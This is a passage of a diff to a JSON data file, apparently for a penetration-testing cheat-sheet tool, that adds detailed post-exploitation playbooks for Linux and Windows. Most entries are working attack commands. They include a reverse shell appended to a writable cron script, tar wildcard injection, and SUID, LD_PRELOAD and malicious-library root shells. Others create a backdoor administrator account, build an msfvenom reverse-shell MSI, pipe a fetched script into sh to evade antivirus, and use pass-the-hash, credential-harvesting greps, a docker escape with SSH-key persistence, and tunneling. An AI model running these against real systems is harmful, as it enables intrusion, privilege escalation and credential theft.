+        "name": "Linux: Cron Jobs & Scheduled Tasks",
+        "description": "Find cron jobs running as root with writable scripts or wildcard injection opportunities.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Enumerate cron jobs",
+            "subdesc": "System and user cron jobs",
             "cmd": [
-              "ss -tlnp",
-              "ip route",
-              "cat /etc/hosts"
+              "crontab -l",
+              "cat /etc/crontab",
+              "ls -la /etc/cron.d/",
+              "ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/",
+              "cat /var/spool/cron/crontabs/* 2>/dev/null",
+              "systemctl list-timers --all 2>/dev/null"
+            ]
+          },
+          {
+            "desc": "Wildcard TAR injection",
+            "subdesc": "If cron runs tar with wildcard (*) in a writable directory → code execution",
+            "cmd": [
+              "# If crontab has: tar czf /tmp/backup.tar.gz *",
+              "echo '' > '--checkpoint=1'",
+              "echo '' > '--checkpoint-action=exec=sh shell.sh'",
+              "echo '#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh"
+            ]
+          },
+          {
+            "desc": "Writable cron scripts",
+            "subdesc": "If a cron script is writable → inject reverse shell",
+            "cmd": [
+              "# Check permissions on scripts referenced in cron",
+              "ls -la /path/to/cron/script.sh",
+              "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /path/to/writable_cron_script.sh"
             ]
           }
         ]
       },
       {
         "id": "post-9",
-        "name": "Linux: Kernel Exploits",
-        "description": "Kernel exploit triage.",
+        "name": "Linux: Password Hunting",
+        "description": "Search the filesystem for cleartext passwords and credentials in config files, logs, and history.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Grep for passwords",
+            "subdesc": "Search common file locations for credentials",
             "cmd": [
-              "uname -r",
-              "searchsploit linux kernel <VERSION>"
+              "grep -Ri 'password' /etc/ /var/ /opt/ /home/ 2>/dev/null | head -50",
+              "grep -Ri 'passwd\\|pass=' /var/www/ /opt/ 2>/dev/null",
+              "find / -name '*.config' -o -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | xargs grep -li 'pass' 2>/dev/null"
+            ]
+          },
+          {
+            "desc": "Locate sensitive files",
+            "subdesc": "Database configs, web configs, SSH keys",
+            "cmd": [
+              "locate password 2>/dev/null | head -20",
+              "find / -name 'wp-config.php' -o -name 'config.php' -o -name '.env' -o -name 'web.config' 2>/dev/null",
+              "cat /var/www/html/wp-config.php 2>/dev/null",
+              "cat /opt/*/.env 2>/dev/null"
+            ]
+          },
+          {
+            "desc": "Database secrets",
+            "subdesc": "Extract creds for lateral movement into data services",
+            "cmd": [
+              "grep -R \"password\\|passwd\\|DB_\" /var/www /opt /home 2>/dev/null",
+              "cat /etc/*conf 2>/dev/null | grep -Ei \"mysql|postgres|redis|mongo\"",
+              "find / -name '*.sql' -o -name '*.sqlite' -o -name '*.db' 2>/dev/null"
             ]
           }
         ]
       },
       {
         "id": "post-10",
-        "name": "Linux: NFS Shares",
-        "description": "NFS misconfiguration checks.",
+        "name": "Linux: Kernel Exploits",
+        "description": "Identify kernel version and match against known local privilege escalation exploits.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Kernel version identification",
+            "subdesc": "Match against exploit databases",
             "cmd": [
-              "showmount -e <TARGET_IP>"
+              "uname -r",
+              "uname -a",
+              "cat /proc/version",
+              "searchsploit linux kernel <VERSION>"
+            ]
+          },
+          {
+            "desc": "Common kernel exploits",
+            "subdesc": "Well-known kernel privesc exploits",
+            "cmd": [
+              "# DirtyPipe CVE-2022-0847: kernel 5.8 - 5.16.11",
+              "# DirtyCow CVE-2016-5195: kernel 2.x - 4.x",
+              "# PwnKit CVE-2021-4034: pkexec polkit SUID",
+              "# GameOver(lay) CVE-2023-2640 / CVE-2023-32629: Ubuntu OverlayFS"
+            ]
+          },
+          {
+            "desc": "Automated exploit suggestion",
+            "subdesc": "Suggest exploits based on kernel version",
+            "cmd": [
+              "# Linux Exploit Suggester:",
+              "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
+              "chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh"
             ]
           }
         ]
       },
       {
         "id": "post-11",
-        "name": "Windows: Basic Enumeration",
-        "description": "Baseline Windows host profile.",
+        "name": "Linux: Automated Enumeration Tools",
+        "description": "Run automated privilege escalation enumeration scripts. Multiple transfer methods for restricted environments.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "LinPEAS",
+            "subdesc": "Most comprehensive Linux privesc enumeration tool",
             "cmd": [
-              "whoami /all",
-              "systeminfo",
-              "ipconfig /all"
+              "# Transfer methods:",
+              "wget http://<LHOST>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh",
+              "curl http://<LHOST>/linpeas.sh -o /tmp/linpeas.sh",
+              "# Netcat transfer (if wget/curl unavailable):",
+              "# Attacker: nc -lvnp 9999 < linpeas.sh",
+              "# Target:   cat < /dev/tcp/<LHOST>/9999 > /tmp/linpeas.sh",
+              "# AV bypass — run from memory (no file on disk):",
+              "curl http://<LHOST>/linpeas.sh | sh",
+              "# Execute:",
+              "./linpeas.sh -a 2>&1 | tee linpeas_output.txt"
+            ]
+          },
+          {
+            "desc": "Other tools",
+            "subdesc": "LinEnum, linux-exploit-suggester, unix-privesc-check",
+            "cmd": [
+              "# LinEnum:",
+              "wget http://<LHOST>/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh -t",
+              "# linux-exploit-suggester (perl):",
+              "wget http://<LHOST>/linux-exploit-suggester.sh && ./linux-exploit-suggester.sh",
+              "# unix-privesc-check:",
+              "wget http://<LHOST>/unix-privesc-check && chmod +x unix-privesc-check && ./unix-privesc-check standard"
             ]
           }
         ]
       },
       {
         "id": "post-12",
-        "name": "Windows: Run WinPEAS",
-        "description": "Automated Windows privesc checks.",
+        "name": "Linux: NFS & Shared Filesystems",
+        "description": "Check NFS exports for no_root_squash misconfiguration — mount share, create SUID binary as root.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Enumerate NFS shares",
+            "subdesc": "Check for exported shares and mount options",
             "cmd": [
-              "certutil -urlcache -split -f http://<LHOST>/winPEASx64.exe C:\\Temp\\winpeas.exe"
+              "showmount -e <TARGET_IP>",
+              "cat /etc/exports 2>/dev/null",
+              "# Look for no_root_squash → root on client = root on share"
+            ]
+          },
+          {
+            "desc": "NFS Root Squashing exploit",
+            "subdesc": "If no_root_squash is set — mount as root, create SUID binary",
+            "cmd": [
+              "# On attacker (as root):",
+              "mkdir /tmp/nfs && mount -t nfs <TARGET>:/<share> /tmp/nfs",
+              "# Compile SUID shell:",
+              "echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > /tmp/nfs/shell.c",
+              "gcc /tmp/nfs/shell.c -o /tmp/nfs/shell",
+              "chmod u+s /tmp/nfs/shell",
+              "# On target: /mount/path/shell → root shell"
             ]
           }
         ]
       },
       {
         "id": "post-13",
-        "name": "Windows: Service Misconfigurations",
-        "description": "Service configuration abuse checks.",
+        "name": "Linux: Path Hijacking",
+        "description": "Exploit scripts or SUID binaries that call commands without full path — hijack via PATH manipulation.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Relative path hijack",
+            "subdesc": "Binary calls 'service' instead of '/usr/sbin/service' — create fake binary first in PATH",
             "cmd": [
-              "sc query",
-              "sc qc <SERVICE_NAME>"
+              "# Find target: strings /usr/local/bin/suid-binary | grep -v '/'",
+              "echo '/bin/bash' > /tmp/service",
+              "chmod +x /tmp/service",
+              "export PATH=/tmp:$PATH",
+              "/usr/local/bin/suid-binary → spawns root shell"
+            ]
+          },
+          {
+            "desc": "Absolute path hijack (LD_PRELOAD)",
+            "subdesc": "If sudo allows env_keep += LD_PRELOAD → preload malicious library",
+            "cmd": [
+              "# Check: sudo -l → env_keep += LD_PRELOAD",
+              "# Compile preload library:",
+              "echo '#include <stdio.h>\\n#include <stdlib.h>\\nvoid _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); }' > /tmp/pe.c",
+              "gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles",
+              "sudo LD_PRELOAD=/tmp/pe.so <allowed_binary>"
             ]
           }
         ]
       },
       {
         "id": "post-14",
-        "name": "Windows: Token Impersonation",
-        "description": "Check impersonation opportunities.",
+        "name": "Linux: Shared Object Injection",
+        "description": "If a SUID binary loads a missing shared object (.so) from a writable path — inject malicious library.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Find missing shared objects",
+            "subdesc": "Use strace to identify missing .so files loaded from writable paths",
             "cmd": [
-              "whoami /priv"
+              "strace /usr/local/bin/suid-binary 2>&1 | grep -i 'no such file'",
+              "# Look for: open(\"/writable/path/lib.so\", ...) = -1 ENOENT"
+            ]
+          },
+          {
+            "desc": "Compile malicious shared object",
+            "subdesc": "Create .so that spawns a root shell when loaded",
+            "cmd": [
+              "echo '#include <stdio.h>\\n#include <stdlib.h>\\nstatic void inject() __attribute__((constructor));\\nvoid inject() { setuid(0); setgid(0); system(\"/bin/bash -p\"); }' > /tmp/exploit.c",
+              "gcc -shared -fPIC -o /writable/path/lib.so /tmp/exploit.c",
+              "/usr/local/bin/suid-binary → loads malicious .so → root"
             ]
           }
         ]
       },
       {
         "id": "post-15",
-        "name": "Windows: Stored Credentials",
-        "description": "Stored secret discovery.",
+        "name": "Linux: Docker Escalation",
+        "description": "If current user is in the docker group — mount host filesystem to escape container and get root.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Check docker group membership",
+            "subdesc": "Docker group = effectively root on host",
             "cmd": [
-              "cmdkey /list"
+              "id | grep docker",
+              "groups"
+            ]
+          },
+          {
+            "desc": "Docker root escape",
+            "subdesc": "Mount host filesystem inside container",
+            "cmd": [
+              "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+              "# Alternative — read /etc/shadow:",
+              "docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow",
+              "# Add SSH key for persistence:",
+              "docker run -v /root:/mnt --rm alpine sh -c 'echo <pub_key> >> /mnt/.ssh/authorized_keys'"
             ]
           }
         ]
       },
       {
         "id": "post-16",
-        "name": "Windows: AlwaysInstallElevated",
-        "description": "MSI privilege escalation path.",
+        "name": "Linux: Domain-Joined Enumeration",
+        "description": "If the Linux host is joined to AD — enumerate domain users and realm information.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Realm & domain info",
+            "subdesc": "Check if host is domain-joined",
             "cmd": [
-              "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+              "realm list",
+              "adcli info <domain>",
+              "cat /etc/krb5.conf 2>/dev/null",
+              "klist 2>/dev/null"
             ]
           }
         ]
       },
       {
         "id": "post-17",
-        "name": "Windows: Pass the Hash",
-        "description": "Lateral movement with NTLM hashes.",
+        "name": "Windows: User Enumeration",
+        "description": "Identify current user privileges, groups, other users, and command history for credential discovery.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Current user context",
+            "subdesc": "Privileges, groups, and token info",
             "cmd": [
-              "impacket-psexec admin@<TARGET_IP> -hashes :<NTLM_HASH>"
+              "whoami",
+              "whoami /priv",
+              "whoami /groups",
+              "net user %username%"
+            ]
+          },
+          {
+            "desc": "All users & groups",
+            "subdesc": "Enumerate local users and group memberships",
+            "cmd": [
+              "net user",
+              "net localgroup",
+              "net localgroup Administrators",
+              "Get-LocalUser | ft Name,Enabled,LastLogon",
+              "Get-LocalGroupMember -Group 'Administrators'"
+            ]
+          },
+          {
+            "desc": "Command history & saved credentials",
+            "subdesc": "PowerShell history and saved sessions",
+            "cmd": [
+              "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
+              "(Get-PSReadlineOption).HistorySavePath",
+              "Get-History",
+              "cmdkey /list",
+              "# Use saved creds: runas /savecred /user:<user> cmd.exe"
             ]
           }
         ]
       },
       {
         "id": "post-18",
-        "name": "Windows: Kerberoasting",
-        "description": "Service ticket extraction and cracking.",
+        "name": "Windows: System Enumeration",
+        "description": "Identify OS version, architecture, hotfixes, and installed software for exploit matching.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "System information",
+            "subdesc": "OS, architecture, hotfixes",
             "cmd": [
-              "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request"
+              "systeminfo",
+              "hostname",
+              "[System.Environment]::OSVersion.Version",
+              "wmic os get Caption,Version,BuildNumber,OSArchitecture",
+              "wmic qfe get Caption,Description,HotFixID,InstalledOn"
+            ]
+          },
+          {
+            "desc": "Installed software",
+            "subdesc": "Check for vulnerable application versions",
+            "cmd": [
+              "wmic product get name,version,vendor",
+              "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion",
+              "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion"
             ]
           }
         ]
       },
       {
         "id": "post-19",
-        "name": "Linux: NFS Pivot Validation (111/2049)",
-        "description": "Validate NFS pivot opportunities after foothold.",
+        "name": "Windows: Network Enumeration",
+        "description": "Discover network configuration, listening ports, routes, and ARP table for pivot opportunities.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Network configuration",
+            "subdesc": "Interfaces, DNS, domain info",
             "cmd": [
-              "showmount -e <TARGET_IP>",
-              "mount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs"
+              "ipconfig /all",
+              "route print",
+              "arp -a"
+            ]
+          },
+          {
+            "desc": "Listening services & connections",
+            "subdesc": "Internal services that may be exploitable",
+            "cmd": [
+              "netstat -ano",
+              "netstat -ano | findstr LISTENING",
+              "netstat -ano | findstr ESTABLISHED"
             ]
           }
         ]
       },
       {
         "id": "post-20",
-        "name": "Linux: Harvest DB Secrets (3306/5432/6379/27017)",
-        "description": "Extract creds for lateral movement into data services.",
+        "name": "Windows: Service Enumeration",
+        "description": "Enumerate running services, scheduled tasks, vault credentials, and firewall status.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Services & processes",
+            "subdesc": "Running services and their binary paths",
             "cmd": [
-              "grep -R \"password|passwd|DB_\" /var/www /opt /home 2>/dev/null",
-              "cat /etc/*conf 2>/dev/null | grep -Ei \"mysql|postgres|redis|mongo\""
+              "wmic service get name,displayname,pathname,startmode",
+              "tasklist /SVC",
+              "sc query state= all",
+              "sc qc <SERVICE_NAME>"
+            ]
+          },
+          {
+            "desc": "Credential vault & DPAPI",
+            "subdesc": "Check Windows credential storage",
+            "cmd": [
+              "vaultcmd /listcreds:\"Windows Credentials\" /all",
+              "cmdkey /list"
+            ]
+          },
+          {
+            "desc": "Firewall & AV status",
+            "subdesc": "Check security controls",
+            "cmd": [
+              "sc query windefend",
+              "netsh advfirewall show allprofiles",
+              "netsh advfirewall firewall show rule name=all | more",
+              "Get-MpComputerStatus 2>$null"
+            ]
+          },
+          {
+            "desc": "GPO enumeration",
+            "subdesc": "Group Policy Objects applied to host",
+            "cmd": [
+              "gpresult /r",
+              "Get-GPO -All 2>$null",
+              "Get-GPPermission -All -TargetType Computer -TargetName $env:COMPUTERNAME 2>$null"
             ]
           }
         ]
       },
       {
         "id": "post-21",
-        "name": "Windows: AD Enumeration (88/389/636/3268/3269)",
-        "description": "Deep AD and trust/path analysis from compromised host.",
+        "name": "Windows: Automated Enumeration Tools",
+        "description": "Run WinPEAS, PowerUp, PrivescCheck for comprehensive automated privilege escalation scanning.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "WinPEAS",
+            "subdesc": "Most comprehensive Windows privesc enumeration",
             "cmd": [
-              "nltest /dclist:<DOMAIN>",
-              "Get-ADDomain",
-              "Get-ADUser -Filter * -Properties *"
+              "# Transfer methods:",
+              "certutil -urlcache -split -f http://<LHOST>/winPEASx64.exe C:\\Temp\\winpeas.exe",
+              "iwr http://<LHOST>/winPEASx64.exe -OutFile C:\\Temp\\winpeas.exe",
+              "# Execute:",
+              ".\\winpeas.exe > winpeas_output.txt"
+            ]
+          },
+          {
+            "desc": "PowerUp.ps1",
+            "subdesc": "PowerShell privesc enumeration — finds service misconfigs, DLL hijack, etc.",
+            "cmd": [
+              "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"",
+              "Get-ModifiableServiceFile",
+              "Get-UnquotedService",
+              "Get-ModifiablePath"
+            ]
+          },
+          {
+            "desc": "PrivescCheck",
+            "subdesc": "Modern PowerShell privesc checker",
+            "cmd": [
+              "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,HTML\""
             ]
           }
         ]
       },
       {
         "id": "post-22",
-        "name": "Windows: SMB Lateral Movement Prep (139/445)",
-        "description": "Enumerate reachable hosts and admin shares.",
+        "name": "Windows: Service Binary Hijacking",
+        "description": "Find services with writable binary paths. Replace the binary with a payload to execute as SYSTEM on restart.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Find vulnerable services",
+            "subdesc": "Query services and check binary path permissions",
             "cmd": [
-              "net view /domain",
-              "net use \\<TARGET_IP>C$ /user:<DOMAIN>\\<USER> <PASS>"
+              "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}",
+              "# Check permissions on service binary (look for F or M for current user):",
+              "icacls \"C:\\path\\to\\service.exe\"",
+              "# Permission mask: F=Full, M=Modify, RX=ReadExecute, R=Read, W=Write"
+            ]
+          },
+          {
+            "desc": "Exploit — replace binary",
+            "subdesc": "Cross-compile adduser payload, replace service binary, restart",
+            "cmd": [
+              "# Compile payload (on Kali):",
+              "# adduser.c: #include <stdlib.h> int main() { system(\"net user hacker Password123! /add && net localgroup Administrators hacker /add\"); return 0; }",
+              "x86_64-w64-mingw32-gcc adduser.c -o adduser.exe",
+              "# Replace service binary:",
+              "move C:\\path\\to\\service.exe service.exe.bak",
+              "copy adduser.exe C:\\path\\to\\service.exe",
+              "net stop <service> && net start <service>",
+              "# PowerUp automated: Install-ServiceBinary -Name '<service>'"
             ]
           }
         ]
       },
       {
         "id": "post-23",
-        "name": "Windows: WinRM Lateral Movement (5985/5986)",
-        "description": "Validate PowerShell remoting movement paths.",
+        "name": "Windows: DLL Hijacking",
+        "description": "Exploit DLL search order — if a service loads a missing DLL from a writable path, place a malicious DLL there.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "DLL search order",
+            "subdesc": "Windows searches for DLLs in this order — hijack at writable location",
             "cmd": [
-              "Test-WSMan <TARGET_IP>",
-              "evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>"
+              "# 1. Directory of the application",
+              "# 2. C:\\Windows\\System32",
+              "# 3. C:\\Windows\\System",
+              "# 4. C:\\Windows",
+              "# 5. Current working directory",
+              "# 6. PATH environment variable directories"
+            ]
+          },
+          {
+            "desc": "Discovery with Procmon",
+            "subdesc": "Use Process Monitor to find missing DLLs (NAME NOT FOUND results)",
+            "cmd": [
+              "# Procmon filters:",
+              "# Operation: CreateFile, Result: NAME NOT FOUND, Path ends with: .dll",
+              "# Restart the target service and observe which DLLs are missing"
+            ]
+          },
+          {
+            "desc": "Create malicious DLL",
+            "subdesc": "C++ DLL that executes payload when loaded by service",
+            "cmd": [
+              "# malicious.cpp: BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) { if (reason == DLL_PROCESS_ATTACH) { system(\"cmd /c net user hacker Password123! /add && net localgroup Administrators hacker /add\"); } return TRUE; }",
+              "x86_64-w64-mingw32-gcc malicious.cpp --shared -o malicious.dll",
+              "# Copy to writable location in DLL search path",
+              "# Restart service: net stop <service> && net start <service>"
             ]
           }
         ]
       },
       {
         "id": "post-24",
-        "name": "Loot: Flags & Sensitive Files",
-        "description": "Hunt for proof and sensitive files.",
+        "name": "Windows: Unquoted Service Paths",
+        "description": "If a service path has spaces and is unquoted, Windows will try shorter paths first — place malicious exe at those paths.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Find unquoted service paths",
+            "subdesc": "Look for paths with spaces that are NOT wrapped in quotes",
             "cmd": [
-              "find / -name \"*.txt\" -o -name \"*.conf\" -o -name \"*.bak\" 2>/dev/null"
+              "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"",
+              "# Example: C:\\Program Files\\My App\\service.exe",
+              "# Windows tries: C:\\Program.exe → C:\\Program Files\\My.exe → C:\\Program Files\\My App\\service.exe"
+            ]
+          },
+          {
+            "desc": "Exploit — place binary at shorter path",
+            "subdesc": "Check write permissions on parent directories, place payload",
+            "cmd": [
+              "icacls \"C:\\Program Files\\My App\"",
+              "# If writable, place payload:",
+              "copy payload.exe \"C:\\Program Files\\My.exe\"",
+              "net stop <service> && net start <service>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "post-25",
+        "name": "Windows: Scheduled Tasks PrivEsc",
+        "description": "Find scheduled tasks running as SYSTEM with writable scripts or binary paths.",
+        "commands": [
+          {
+            "desc": "Enumerate scheduled tasks",
+            "subdesc": "Look for tasks running as SYSTEM with modifiable actions",
+            "cmd": [
+              "schtasks /query /fo LIST /v",
+              "# Focus on:",
+              "# - Task To Run: path to script/binary",
+              "# - Run As User: SYSTEM or high-priv account",
+              "# - Schedule Type: when does it run",
+              "# Check permissions on the binary/script:",
+              "icacls \"C:\\path\\to\\scheduled\\script.bat\""
+            ]
+          }
+        ]
+      },
+      {
+        "id": "post-26",
+        "name": "Windows: AlwaysInstallElevated",
+        "description": "If both HKLM and HKCU AlwaysInstallElevated keys are set to 1, any user can install MSI packages as SYSTEM.",
+        "commands": [
+          {
+            "desc": "Check registry keys",
+            "subdesc": "Both keys must be set to 1 for exploitation",
+            "cmd": [
+              "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+              "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+            ]
+          },
+          {
+            "desc": "Exploit — generate and install malicious MSI",
+            "subdesc": "Create MSI payload with msfvenom, install for SYSTEM shell",
+            "cmd": [
+              "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi",
+              "msiexec /quiet /qn /i C:\\Temp\\shell.msi"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "post-27",
+        "name": "Windows: Token Impersonation",
+        "description": "Check for SeImpersonate/SeAssignPrimaryToken privileges — abuse with potato exploits or Meterpreter incognito.",
+        "commands": [
+          {
+            "desc": "Check privileges",
+            "subdesc": "Look for impersonation privileges on service accounts",
+            "cmd": [
+              "whoami /priv",
+              "# Key privileges: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege"
+            ]
+          },
+          {
+            "desc": "Potato exploits",
+            "subdesc": "Exploit SeImpersonate to get SYSTEM",
+            "cmd": [
+              "PrintSpoofer.exe -i -c powershell.exe",
+              "GodPotato.exe -cmd \"cmd /c <payload>\"",
+              "JuicyPotato.exe -l 1337 -c {CLSID} -p cmd.exe -a \"/c <payload>\" -t *",
+              "RoguePotato.exe -r <LHOST> -e \"cmd /c <payload>\" -l 9999"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "post-28",
+        "name": "Windows: Stored Credentials & Pass the Hash",
+        "description": "Extract stored credentials and use NTLM hashes for lateral movement.",
+        "commands": [
+          {
+            "desc": "Stored credentials",
+            "subdesc": "Windows credential manager and saved sessions",
+            "cmd": [
+              "cmdkey /list",
+              "runas /savecred /user:<domain>\\<user> cmd.exe",
+              "vaultcmd /listcreds:\"Windows Credentials\" /all"
+            ]
+          },
+          {
+            "desc": "Pass the Hash",
+            "subdesc": "Use NTLM hash without knowing plaintext password",
+            "cmd": [
+              "impacket-psexec <domain>/<user>@<TARGET_IP> -hashes :<NTLM_HASH>",
+              "impacket-wmiexec <domain>/<user>@<TARGET_IP> -hashes :<NTLM_HASH>",
+              "evil-winrm -i <TARGET_IP> -u <user> -H <NTLM_HASH>",
+              "nxc smb <TARGET_IP> -u <user> -H <NTLM_HASH>",
+              "nxc winrm <TARGET_IP> -u <user> -H <NTLM_HASH>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "post-29",
+        "name": "Windows: AD Enumeration from Host",
+        "description": "Deep Active Directory enumeration and trust analysis from a compromised domain-joined host.",
+        "commands": [
+          {
+            "desc": "Domain information",
+            "subdesc": "Basic domain and DC enumeration",
+            "cmd": [
+              "nltest /dclist:<DOMAIN>",
+              "nltest /domain_trusts",
+              "Get-ADDomain",
+              "Get-ADForest"
+            ]
+          },
+          {
+            "desc": "User & group enumeration",
+            "subdesc": "Domain users, groups, admins",
+            "cmd": [
+              "net user /domain",
+              "net group \"Domain Admins\" /domain",
+              "net group \"Enterprise Admins\" /domain",
+              "Get-ADUser -Filter * -Properties * | Select SamAccountName,Description,MemberOf",
+              "Get-ADGroupMember -Identity 'Domain Admins' -Recursive"
+            ]
+          },
+          {
+            "desc": "SMB Lateral Movement",
+            "subdesc": "Enumerate reachable hosts and admin shares",
+            "cmd": [
+              "net view /domain",
+              "net use \\\\<TARGET_IP>\\C$ /user:<DOMAIN>\\<USER> <PASS>",
+              "nxc smb <subnet>/24 -u <user> -p <pass>"
+            ]
+          },
+          {
+            "desc": "WinRM Lateral Movement",
+            "subdesc": "PowerShell remoting for post-exploitation",
+            "cmd": [
+              "Test-WSMan <TARGET_IP>",
+              "evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>",
+              "Enter-PSSession -ComputerName <TARGET> -Credential <domain>\\<user>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "post-30",
+        "name": "Pivoting: SSH Tunneling",
+        "description": "Create SSH tunnels to pivot through compromised hosts and access internal networks.",
+        "commands": [
+          {
+            "desc": "Local port forward",
+            "subdesc": "Forward local port to remote service through SSH host",
+            "cmd": [
+              "ssh -L <LPORT>:<target_internal_ip>:<target_port> user@<pivot_host>",
+              "# Example: ssh -L 8080:10.10.10.5:80 user@pivot → access 10.10.10.5:80 via localhost:8080"
+            ]
+          },
+          {
+            "desc": "Remote port forward",
+            "subdesc": "Forward remote port back to attacker — useful for reverse shells through pivot",
+            "cmd": [
+              "ssh -R <RPORT>:127.0.0.1:<LPORT> user@<attacker_ip>",
+              "# Example: ssh -R 9999:127.0.0.1:80 kali@10.10.14.5 → pivot's port 80 accessible on kali:9999"
+            ]
+          },
+          {
+            "desc": "Dynamic port forward (SOCKS proxy)",
+            "subdesc": "Create SOCKS4/5 proxy — route any traffic through pivot host",
+            "cmd": [
+              "ssh -D 1080 user@<pivot_host>",
+              "# Configure proxychains: edit /etc/proxychains4.conf → socks5 127.0.0.1 1080",
+              "proxychains nmap -sT -Pn <internal_target>",
+              "proxychains curl http://<internal_target>"
+            ]
+          },
+          {
+            "desc": "Remote dynamic port forward",
+            "subdesc": "SOCKS proxy from pivot back to attacker (OpenSSH 7.6+)",
+            "cmd": [
+              "ssh -R 1080 user@<attacker_ip>",
+              "# SOCKS proxy created on attacker's port 1080"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "post-31",
+        "name": "Pivoting: Chisel",
+        "description": "HTTP-based tunneling tool. Single binary, works through firewalls. SOCKS5 proxy for full network pivoting.",
+        "commands": [
+          {
+            "desc": "Reverse SOCKS proxy setup",
+            "subdesc": "Most common — creates SOCKS5 on attacker, tunnels through target",
+            "cmd": [
+              "# On attacker (server):",
+              "chisel server --reverse --socks5 -p 8000",
+              "# On target (client):",
+              "chisel client <LHOST>:8000 R:socks",
+              "# SOCKS5 proxy available on attacker at 127.0.0.1:1080",
+              "# Configure proxychains: socks5 127.0.0.1 1080",
+              "proxychains nmap -sT -Pn <internal_target>"
+            ]
+          },
+          {
+            "desc": "Port forward",
+            "subdesc": "Forward specific port through chisel tunnel",
+            "cmd": [
+              "# On attacker: chisel server --reverse -p 8000",
+              "# On target: chisel client <LHOST>:8000 R:8443:127.0.0.1:443",
+              "# Now attacker's 8443 → target's localhost:443"
+            ]
+          },
+          {
+            "desc": "Browser proxy (FoxyProxy)",
+            "subdesc": "Configure browser to use chisel SOCKS proxy for web apps",
+            "cmd": [
+              "# FoxyProxy settings:",
+              "# Type: SOCKS5, IP: 127.0.0.1, Port: 1080"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "post-32",
+        "name": "Pivoting: Ligolo-ng",
+        "description": "Advanced tunneling with TUN interface — no SOCKS proxy needed, direct routing. Supports chained agents for multi-hop. Download from https://github.com/nicocha30/ligolo-ng/releases — get both proxy (attacker) and agent (target) binaries.",
+        "commands": [
+          {
+            "desc": "Download Ligolo-ng",
+            "subdesc": "Download proxy for your attacker OS and agent for the target OS from GitHub releases",
+            "cmd": [
+              "# Download latest from: https://github.com/nicocha30/ligolo-ng/releases",
+              "# Attacker (Linux): ligolo-ng_proxy_*_linux_amd64.tar.gz",
+              "# Target (Windows): ligolo-ng_agent_*_windows_amd64.zip",
+              "# Target (Linux): ligolo-ng_agent_*_linux_amd64.tar.gz"
+            ]
+          },
+          {
+            "desc": "Basic tunnel setup",
+            "subdesc": "Create TUN interface on attacker, connect agent from target",
+            "cmd": [
+              "# On attacker — create TUN interface:",
+              "sudo ip tuntap add user $(whoami) mode tun ligolo",
+              "sudo ip link set ligolo up",
+              "# Start proxy:",
